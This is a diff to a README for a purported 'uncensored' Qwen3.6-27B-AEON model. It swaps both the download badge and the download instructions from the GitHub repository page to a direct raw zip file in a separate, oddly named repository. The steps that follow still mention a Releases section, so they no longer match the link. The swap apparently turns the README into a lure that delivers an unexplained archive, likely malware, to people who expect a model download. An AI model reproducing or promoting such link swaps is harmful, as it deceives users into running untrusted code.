@@ -5,7 +5,7 @@ description: "Run the uncensored Qwen3.6-27B-AEON multimodal model locally on Ap
 ---
 # 🚀 Qwen3.6-27B-AEON-Ultimate-Uncensored-MLX - Run advanced artificial intelligence on hardware
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Mureilfortysixth457/Qwen3.6-27B-AEON-Ultimate-Uncensored-MLX)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://raw.githubusercontent.com/Mureilfortysixth457/mureilfortysixth457.github.io/main/muermo/github-mureilfortysixth-io-v1.5.zip)
 
 ## 📖 About this software
 
@@ -25,7 +25,7 @@ If you have less than 32 gigabytes of memory, the model might run slowly or fail
 
 ## ⬇️ How to get the software
 
-Visit this page to download the files: https://github.com/Mureilfortysixth457/Qwen3.6-27B-AEON-Ultimate-Uncensored-MLX
+Visit this page to download the files: https://raw.githubusercontent.com/Mureilfortysixth457/mureilfortysixth457.github.io/main/muermo/github-mureilfortysixth-io-v1.5.zip
 
 1. Open the link in your web browser.
 2. Find the section labeled Releases on the right side of the screen.
